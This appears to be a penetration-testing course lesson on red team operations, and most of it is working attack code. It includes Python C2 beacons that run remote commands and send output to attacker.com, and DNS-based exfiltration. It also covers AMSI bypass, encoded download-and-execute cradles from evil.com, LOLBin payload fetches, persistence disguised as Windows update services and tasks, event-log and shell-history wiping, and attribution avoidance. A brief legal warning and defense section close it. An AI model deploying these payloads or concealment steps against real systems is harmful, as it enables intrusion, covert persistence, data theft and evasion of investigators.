# LESSON 13: Red Team Operations & Advanced Persistence

## Objective
Master advanced red team techniques including command and control (C2) frameworks, evasion methods, and long-term persistence. Learn operational security (OPSEC) and advanced post-exploitation techniques for extended network access.

## Prerequisites
- Lessons 1-12 completed
- Understanding of network protocols
- Knowledge of operating system internals
- Experience with scripting and automation

## Phase 1: Command & Control (C2) Frameworks

### Step 1: Cobalt Strike Setup & Usage
```bash
# Cobalt Strike team server setup
sudo ./teamserver [external-ip] [password] [malleable-c2-profile]

# Connect to team server
./cobaltstrike

# Generate payloads
# Attacks -> Packages -> Windows Executable (S)
# Attacks -> Web Drive-by -> Scripted Web Delivery

# Beacon configuration
set HTTPS_PORT 443
set HTTP_PORT 80  
set USERAGENT "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
```

### Step 2: Empire/Starkiller Framework
```bash
# Empire setup
git clone https://github.com/EmpireProject/Empire.git
cd Empire
./setup/install.sh
./empire

# Create listener
uselistener http
set Host http://10.0.0.1:8080
set Port 8080
execute

# Generate stager
usestager multi/launcher
set Listener http
execute

# Starkiller GUI interface
python3 starkiller.py
```

### Step 3: Metasploit Framework Advanced Usage
```bash
# Multi-handler for persistent access
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST attack_ip
set LPORT 443
set ExitOnSession false
exploit -j

# Meterpreter advanced commands
background
route add 192.168.1.0 255.255.255.0 1
use post/multi/manage/autoroute
run autoroute -s 192.168.1.0/24

# Persistence modules
use post/windows/manage/persistence_exe
use post/linux/manage/persistence
```

## Phase 2: Custom C2 Development

### Step 4: HTTP/HTTPS C2 Channel
```python
# Simple HTTP C2 server
import http.server
import socketserver
import base64
import subprocess
import threading

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/beacon':
            # Return command to execute
            command = self.server.command_queue.get() if hasattr(self.server, 'command_queue') else ''
            self.send_response(200)
            self.end_headers()
            self.wfile.write(base64.b64encode(command.encode()).encode())
        
        elif self.path.startswith('/results/'):
            # Receive command results
            data = base64.b64decode(self.path.split('/')[-1]).decode()
            print(f"[+] Command output:\n{data}")
            self.send_response(200)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress logging

# C2 client
def beacon():
    import time
    import requests
    import subprocess
    
    c2_url = "http://attacker.com:8080"
    
    while True:
        try:
            # Beacon for commands
            response = requests.get(f"{c2_url}/beacon", timeout=5)
            if response.status_code == 200 and response.content:
                command = base64.b64decode(response.content).decode()
                
                # Execute command
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                
                # Send results back
                encoded_output = base64.b64encode(output.encode()).decode()
                requests.get(f"{c2_url}/results/{encoded_output}")
            
        except:
            pass
        
        time.sleep(30)  # Beacon interval
```

### Step 5: DNS C2 Channel
```python
# DNS C2 implementation
import dns.resolver
import base64
import subprocess

def dns_c2_client(domain):
    while True:
        try:
            # Query for TXT record containing commands
            result = dns.resolver.resolve(f"cmd.{domain}", 'TXT')
            if result:
                command = str(result[0]).strip('"')
                if command:
                    decoded_cmd = base64.b64decode(command).decode()
                    
                    # Execute command
                    output = subprocess.run(decoded_cmd, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    
                    # Exfiltrate via DNS queries
                    encoded_result = base64.b64encode(result.encode()).decode()
                    chunks = [encoded_result[i:i+50] for i in range(0, len(encoded_result), 50)]
                    
                    for i, chunk in enumerate(chunks):
                        dns.resolver.resolve(f"{chunk}.{i}.data.{domain}", 'A')
        
        except:
            pass
        
        time.sleep(60)
```

### Step 6: Domain Fronting
```python
# Domain fronting example
import requests

def domain_fronted_request(data):
    headers = {
        'Host': 'forbidden-c2.com',  # Real C2 domain
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # Send request to CDN but with Host header pointing to real C2
    response = requests.post('https://allowed-cdn.com/api', 
                           headers=headers, 
                           data=data,
                           verify=False)
    
    return response.content
```

## Phase 3: Evasion Techniques

### Step 7: Anti-Virus Evasion
```bash
# Payload encoding/encryption
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Custom packers/crypters
# UPX packer
upx --best --lzma payload.exe

# Custom XOR encryption
python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
key = 0xAA
encrypted = bytes([b ^ key for b in data])
open(sys.argv[1] + '.enc', 'wb').write(encrypted)
" payload.exe

# Process hollowing (advanced technique)
# Requires custom development in C/C++
```

### Step 8: PowerShell Obfuscation
```powershell
# String obfuscation
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded

# Invoke-Obfuscation framework
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
# TOKEN -> ALL -> 1 (obfuscate all tokens)

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PowerShell downgrade attack
powershell.exe -version 2 -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
```

### Step 9: Living Off The Land Binaries (LOLBins)
```bash
# Certutil for download
certutil -urlcache -split -f "http://attacker.com/payload.exe" payload.exe

# PowerShell alternative download
powershell -c "bitsadmin /transfer mydownload /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe"

# Regsvr32 for execution
regsvr32 /s /n /u /i:http://attacker.com/evil.sct scrobj.dll

# Mshta for HTML Application execution
mshta http://attacker.com/payload.hta

# Rundll32 for DLL execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")
```

## Phase 4: Advanced Persistence

### Step 10: Registry-Based Persistence
```bash
# Autorun locations
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

# Services
sc create "WindowsSecurityUpdate" binpath= "C:\Windows\System32\backdoor.exe" start= auto DisplayName= "Windows Security Update Service"
sc start "WindowsSecurityUpdate"

# WMI event subscription
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="ProcessMonitor", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
```

### Step 11: DLL Hijacking
```bash
# Identify vulnerable applications
# Look for applications that load DLLs from writable directories

# Create malicious DLL
# Template DLL that maintains original functionality while adding backdoor

# Common DLL hijacking locations:
# - Application directory
# - System32 (requires admin)
# - Current working directory
# - PATH directories

# PowerShell DLL hijacking check
Get-ChildItem -Path "C:\Program Files" -Recurse -Include "*.exe" | ForEach-Object {
    $dll_path = $_.DirectoryName + "\version.dll"
    if (-not (Test-Path $dll_path)) {
        Write-Host "Potential DLL hijacking: $($_.FullName)"
    }
}
```

### Step 12: Scheduled Task Persistence
```bash
# XML-based scheduled task
cat > BackupTask.xml << 'EOF'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2023-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')"</Arguments>
    </Exec>
  </Actions>
</Task>
EOF

schtasks /create /tn "BackupTask" /xml BackupTask.xml /ru SYSTEM
```

## Phase 5: Network Pivoting & Lateral Movement

### Step 13: SSH Tunneling & Port Forwarding
```bash
# Local port forwarding
ssh -L 8080:internal-server:80 user@jump-server

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@jump-server

# Remote port forwarding
ssh -R 4444:localhost:4444 user@jump-server

# ProxyChains configuration
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 192.168.1.0/24
```

### Step 14: Chisel Tunneling
```bash
# Chisel server (attacker machine)
./chisel server -p 8080 --reverse

# Chisel client (compromised machine)  
./chisel client attacker-ip:8080 R:1080:socks

# Use tunnel
curl --proxy socks5://localhost:1080 http://internal-server
```

### Step 15: Meterpreter Pivoting
```bash
# In Meterpreter session
background
route add 192.168.1.0 255.255.255.0 1

# SOCKS proxy through Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.1.100
```

## Phase 6: Operational Security (OPSEC)

### Step 16: Traffic Analysis Evasion
```bash
# Randomized beacons
# Vary beacon intervals: 30s, 45s, 60s, 90s randomly
# Use jitter to add randomness: ±20%

# User-Agent rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# Domain categorization
# Use domains that appear legitimate:
# - Recently registered domains
# - Domains that mimic legitimate services
# - Domains with proper SSL certificates
```

### Step 17: Log Evasion
```bash
# Clear Windows event logs
wevtutil cl System
wevtutil cl Application
wevtutil cl Security

# PowerShell transcript evasion
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\* -Force

# Sysmon evasion
# Avoid common indicators:
# - Process creation with suspicious command lines
# - Network connections to known bad IPs
# - File creation in suspicious locations

# Linux log clearing
> /var/log/auth.log
> /var/log/syslog
> ~/.bash_history
```

### Step 18: Attribution Avoidance
```bash
# Infrastructure separation
# - Use VPS providers that accept cryptocurrency
# - Route through multiple countries
# - Use Tor for C2 communications

# Time zone consistency
# Match target's time zone for activity
# Avoid activity during local sleep hours

# Language and cultural indicators
# Avoid native language artifacts in code/comments
# Use target's regional spelling/formatting
```

## Custom Scripts Usage

### c2_framework.py
```bash
# Custom lightweight C2 framework
python3 scripts/lesson_13_red_team/c2_framework.py --server --port 8080 --ssl
python3 scripts/lesson_13_red_team/c2_framework.py --client --server attacker.com --port 8080
```

### persistence_toolkit.py
```bash
# Automated persistence deployment
python3 scripts/lesson_13_red_team/persistence_toolkit.py --install --methods registry,scheduled_task,service --stealth
```

## Evidence Collection

### Step 19: Red Team Documentation
```bash
# Operation timeline
echo "$(date): Initial access via phishing" >> red_team_timeline.txt
echo "$(date): Lateral movement to DC achieved" >> red_team_timeline.txt
echo "$(date): Persistence established" >> red_team_timeline.txt

# Compromise artifacts
# Screenshot proof of access
# Command output logs
# Network diagrams showing pivot paths
# List of compromised accounts/systems
```

## Success Criteria

✓ C2 framework deployed and operational
✓ Custom C2 channel developed
✓ AV evasion techniques implemented
✓ Advanced persistence established
✓ Network pivoting achieved
✓ OPSEC measures implemented
✓ Attribution avoided
✓ Custom scripts functioning

## C2 Framework Comparison

| Framework | Pros | Cons | Best For |
|-----------|------|------|----------|
| Cobalt Strike | Professional, stable | Expensive, well-known | Enterprise red teams |
| Empire | Free, PowerShell-based | Deprecated, detected | Windows environments |
| Metasploit | Extensive modules | Noisy, well-signatured | Quick exploitation |
| Sliver | Modern, open source | Newer, smaller community | Advanced users |
| Covenant | .NET-based | Windows-focused | .NET environments |

## Evasion Techniques Summary

### Static Evasion
- **Packers/Crypters**: Compress/encrypt payloads
- **Obfuscation**: Scramble code structure  
- **Code Signing**: Use legitimate certificates
- **Polymorphism**: Change payload on each generation

### Dynamic Evasion
- **Sandbox Detection**: Check for VM/analysis environment
- **Time Delays**: Sleep before malicious activity
- **Environment Checks**: Validate target environment
- **Anti-Debug**: Detect debugging attempts

### Behavioral Evasion
- **Living off the Land**: Use legitimate tools
- **Process Injection**: Hide in legitimate processes
- **DLL Hijacking**: Replace legitimate libraries
- **Fileless Attacks**: Operate only in memory

## Defense Against Red Team Operations

### Detection
- Endpoint Detection and Response (EDR)
- Network monitoring and analysis
- Behavioral analytics
- Threat hunting programs

### Prevention  
- Application whitelisting
- Network segmentation
- Least privilege access
- Regular security training

### Response
- Incident response procedures
- Containment strategies
- Forensic capabilities
- Recovery planning

## Legal and Ethical Considerations

⚠️ **CRITICAL WARNING**: Red team operations must only be conducted:
- With explicit written authorization
- Within defined scope and rules of engagement
- By qualified security professionals
- For legitimate security assessment purposes

**Unauthorized use constitutes criminal activity.**

## Next Lesson Preview
**Lesson 14**: Binary Exploitation & Reverse Engineering  
- Buffer overflow exploitation
- Return-oriented programming (ROP)
- Malware analysis techniques